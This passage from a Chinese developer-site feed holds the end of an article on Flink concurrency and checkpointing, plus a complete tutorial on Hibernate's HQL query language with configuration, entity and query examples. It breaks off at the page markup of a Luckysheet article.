<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createAndSetRunnerContext</span>(<span class="hljs-params">ActionTask actionTask</span>) {
    <span class="hljs-comment">// 正确管理 RunnerContext 的创建和重用</span>
    <span class="hljs-keyword">if</span> (actionTask.<span class="hljs-title function_">getRunnerContext</span>() != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// ... 创建适当的 context</span>
}
</code></pre>
<h4 data-id="heading-34">4.6 水印和事件时间处理</h4>
<p>具备并发意识的水印处理：</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> SegmentedQueue keySegmentQueue;
    
    keySegmentQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SegmentedQueue</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWatermark</span><span class="hljs-params">(Watermark mark)</span> <span class="hljs-keyword">throws</span> Exception {
        keySegmentQueue.addWatermark(mark);
        processEligibleWatermarks();
    }
</code></pre>
<h4 data-id="heading-35">4.7 检查点和恢复</h4>
<p>用于容错的线程安全状态快照</p>
<pre><code class="hljs language-scss" lang="scss">    <span class="hljs-keyword">@Override</span>
    public void snapshotState(StateSnapshotContext context) throws Exception {
        if (actionStateStore != null) {
            <span class="hljs-selector-tag">Object</span> recoveryMarker = actionStateStore<span class="hljs-selector-class">.getRecoveryMarker</span>();
            if (recoveryMarker != null) {
                recoveryMarkerOpState<span class="hljs-selector-class">.update</span>(List.of(recoveryMarker));
            }
        }

        HashMap&lt;<span class="hljs-selector-tag">Object</span>, Long&gt; keyToSeqNum = new HashMap&lt;&gt;();
        <span class="hljs-built_in">getKeyedStateBackend</span>()
                <span class="hljs-selector-class">.applyToAllKeys</span>(
                        VoidNamespace.INSTANCE,
                        VoidNamespaceSerializer.INSTANCE,
                        new ValueStateDescriptor&lt;&gt;(MESSAGE_SEQUENCE_NUMBER_STATE_NAME, Long.class),
                        (key, state) -&gt; keyToSeqNum<span class="hljs-selector-class">.put</span>(key, state.value()));
        checkpointIdToSeqNums<span class="hljs-selector-class">.put</span>(context.getCheckpointId(), keyToSeqNum);

        super<span class="hljs-selector-class">.snapshotState</span>(context);
    }
</code></pre>
<h4 data-id="heading-36">4.8 总结</h4>
<p>设计采用了多种并发机制：</p>
<ul>
<li>Flink并行处理：利用Flink原生的并行性和键控流</li>
<li>每个Key的隔离：每个key维护独立状态，消除key之间的竞争</li>
<li>协作式线程：使用邮箱执行器实现非阻塞执行</li>
<li>异步延续：通过任务链支持长时间运行的操作</li>
<li>线程安全状态管理：对共享资源进行适当的同步</li>
<li>容错机制：检查点机制确保故障情况下的数据一致性</li>
</ul>
<p>这种方法使系统能够在保持一致性和支持水平扩展的同时处理高吞吐量，可在 Flink 集群的多个节点间扩展。</p>
<h3 data-id="heading-37">0xFF 参考</h3>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（10）Hibernate的查询语言（HQL）是什么？]]></title>    <link>https://juejin.cn/post/7589126217250701353</link>    <guid>https://juejin.cn/post/7589126217250701353</guid>    <pubDate>2025-12-29T12:34:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217250701353" data-draft-id="7589099845186715684" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（10）Hibernate的查询语言（HQL）是什么？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-29T12:34:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（10）Hibernate的查询语言（HQL）是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:34:20.000Z" title="Mon Dec 29 2025 12:34:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernate查询语言（HQL，Hibernate Query Language）是一种面向对象的查询语言，它类似于SQL，但操作的是Hibernate映射的持久化对象及其属性而不是数据库表。HQL的强大之处在于它能够利用Hibernate的映射和关联，简化复杂的查询操作。</p>
<h3 data-id="heading-0">主要特点</h3>
<ol>
<li><strong>面向对象</strong>：HQL操作的是对象及其属性，而不是数据库表和列。</li>
<li><strong>自动转换</strong>：HQL查询会自动转换成相应的SQL查询。</li>
<li><strong>支持投影和聚合</strong>：HQL支持投影、聚合、排序、分组等操作。</li>
<li><strong>支持关联和连接</strong>：可以通过对象关系导航进行关联和连接操作。</li>
</ol>
<h3 data-id="heading-1">HQL查询示例</h3>
<p>下面是一个完整的示例，展示如何使用HQL进行各种查询操作。</p>
<h4 data-id="heading-2">配置文件 <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil 类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">实体类 Student</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h4 data-id="heading-5">使用HQL的查询示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.query.Query;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateHQLExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        <span class="hljs-comment">// 打开一个新的Session</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();

        <span class="hljs-comment">// 启动事务</span>
        session.beginTransaction();

        <span class="hljs-comment">// 创建并保存Student对象</span>
        <span class="hljs-type">Student</span> <span class="hljs-variable">student1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
        <span class="hljs-type">Student</span> <span class="hljs-variable">student2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Jane Doe"</span>, <span class="hljs-number">22</span>);
        session.save(student1);
        session.save(student2);

        <span class="hljs-comment">// 提交事务</span>
        session.getTransaction().commit();

        <span class="hljs-comment">// 查询所有学生</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"FROM Student"</span>;
        Query&lt;Student&gt; query = session.createQuery(hql, Student.class);
        List&lt;Student&gt; students = query.list();
        <span class="hljs-keyword">for</span> (Student student : students) {
            System.out.println(<span class="hljs-string">"Student: "</span> + student.getName() + <span class="hljs-string">", Age: "</span> + student.getAge());
        }

        <span class="hljs-comment">// 带条件的查询</span>
        hql = <span class="hljs-string">"FROM Student S WHERE S.age &gt; :student_age"</span>;
        query = session.createQuery(hql, Student.class);
        query.setParameter(<span class="hljs-string">"student_age"</span>, <span class="hljs-number">21</span>);
        students = query.list();
        <span class="hljs-keyword">for</span> (Student student : students) {
            System.out.println(<span class="hljs-string">"Filtered Student: "</span> + student.getName() + <span class="hljs-string">", Age: "</span> + student.getAge());
        }

        <span class="hljs-comment">// 投影查询</span>
        hql = <span class="hljs-string">"SELECT S.name FROM Student S"</span>;
        Query&lt;String&gt; nameQuery = session.createQuery(hql, String.class);
        List&lt;String&gt; names = nameQuery.list();
        <span class="hljs-keyword">for</span> (String name : names) {
            System.out.println(<span class="hljs-string">"Student Name: "</span> + name);
        }

        <span class="hljs-comment">// 聚合查询</span>
        hql = <span class="hljs-string">"SELECT COUNT(S.id) FROM Student S"</span>;
        Query&lt;Long&gt; countQuery = session.createQuery(hql, Long.class);
        <span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> countQuery.getSingleResult();
        System.out.println(<span class="hljs-string">"Total Students: "</span> + count);

        <span class="hljs-comment">// 排序查询</span>
        hql = <span class="hljs-string">"FROM Student S ORDER BY S.age DESC"</span>;
        query = session.createQuery(hql, Student.class);
        students = query.list();
        <span class="hljs-keyword">for</span> (Student student : students) {
            System.out.println(<span class="hljs-string">"Sorted Student: "</span> + student.getName() + <span class="hljs-string">", Age: "</span> + student.getAge());
        }

        <span class="hljs-comment">// 分组查询</span>
        hql = <span class="hljs-string">"SELECT S.age, COUNT(S.id) FROM Student S GROUP BY S.age"</span>;
        Query&lt;Object[]&gt; groupQuery = session.createQuery(hql, Object[].class);
        List&lt;Object[]&gt; groupResults = groupQuery.list();
        <span class="hljs-keyword">for</span> (Object[] result : groupResults) {
            System.out.println(<span class="hljs-string">"Age: "</span> + result[<span class="hljs-number">0</span>] + <span class="hljs-string">", Count: "</span> + result[<span class="hljs-number">1</span>]);
        }

        <span class="hljs-comment">// 关闭Session</span>
        session.close();
        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-6">详细解释</h3>
<ol>
<li>
<p><strong>查询所有学生</strong>：使用<code>FROM Student</code>语句查询所有学生对象。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"FROM Student"</span>;
Query&lt;Student&gt; query = session.createQuery(hql, Student.class);
List&lt;Student&gt; students = query.list();
</code></pre>
</li>
<li>
<p><strong>带条件的查询</strong>：使用<code>WHERE</code>子句添加条件查询，例如查找年龄大于21岁的学生。</p>
<pre><code class="hljs language-java" lang="java">hql = <span class="hljs-string">"FROM Student S WHERE S.age &gt; :student_age"</span>;
query = session.createQuery(hql, Student.class);
query.setParameter(<span class="hljs-string">"student_age"</span>, <span class="hljs-number">21</span>);
List&lt;Student&gt; students = query.list();
</code></pre>
</li>
<li>
<p><strong>投影查询</strong>：使用<code>SELECT</code>子句选择特定字段，例如只选择学生的名字。</p>
<pre><code class="hljs language-java" lang="java">hql = <span class="hljs-string">"SELECT S.name FROM Student S"</span>;
Query&lt;String&gt; nameQuery = session.createQuery(hql, String.class);
List&lt;String&gt; names = nameQuery.list();
</code></pre>
</li>
<li>
<p><strong>聚合查询</strong>：使用聚合函数，例如<code>COUNT</code>函数统计学生人数。</p>
<pre><code class="hljs language-java" lang="java">hql = <span class="hljs-string">"SELECT COUNT(S.id) FROM Student S"</span>;
Query&lt;Long&gt; countQuery = session.createQuery(hql, Long.class);
<span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> countQuery.getSingleResult();
</code></pre>
</li>
<li>
<p><strong>排序查询</strong>：使用<code>ORDER BY</code>子句进行排序，例如按年龄降序排序。</p>
<pre><code class="hljs language-java" lang="java">hql = <span class="hljs-string">"FROM Student S ORDER BY S.age DESC"</span>;
query = session.createQuery(hql, Student.class);
List&lt;Student&gt; students = query.list();
</code></pre>
</li>
<li>
<p><strong>分组查询</strong>：使用<code>GROUP BY</code>子句进行分组查询，例如按年龄分组统计每个年龄段的学生人数。</p>
<pre><code class="hljs language-java" lang="java">hql = <span class="hljs-string">"SELECT S.age, COUNT(S.id) FROM Student S GROUP BY S.age"</span>;
Query&lt;Object[]&gt; groupQuery = session.createQuery(hql, Object[].class);
List&lt;Object[]&gt; groupResults = groupQuery.list();
</code></pre>
</li>
</ol>
<h3 data-id="heading-7">总结</h3>
<p>HQL是一种功能强大的查询语言，它简化了Hibernate持久化对象的查询操作。通过HQL可以方便地进行各种复杂的查询操作，如条件查询、投影查询、聚合查询、排序查询和分组查询。此外，HQL与数据库无关，这使得应用程序在不同数据库之间具有良好的可移植性。通过熟练掌握HQL，可以高效地进行数据库操作，提高应用程序的性能和可维护性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Luckysheet 远程搜索下拉 控件开发 : 揭秘二开全流程]]></title>    <link>https://juejin.cn/post/7589126920286289930</link>    <guid>https://juejin.cn/post/7589126920286289930</guid>    <pubDate>2025-12-29T12:47:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126920286289930" data-draft-id="7589093895327023113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Luckysheet  远程搜索下拉 控件开发 : 揭秘二开全流程"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-29T12:47:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="朴shu"/> <meta itemprop="url" content="https://juejin.cn/user/3866303125264135"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Luckysheet  远程搜索下拉 控件开发 : 揭秘二开全流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3866303125264135/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    朴shu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:47:46.000Z" title="Mon Dec 29 2025 12:47:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid 